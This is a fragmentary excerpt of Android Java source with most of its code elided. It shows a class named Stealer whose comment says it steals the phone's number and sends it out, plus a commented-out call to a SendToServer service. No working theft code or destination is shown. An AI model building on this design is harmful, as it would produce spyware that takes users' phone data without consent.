 ...
 * @since 1.0
 */
public class Stealer extends IntentService {
    ...
    /**
     * Creates the Stealer IntentService, stealing the phone number and sending it.
...
//        startService(new Intent(this, SendToServer.class));
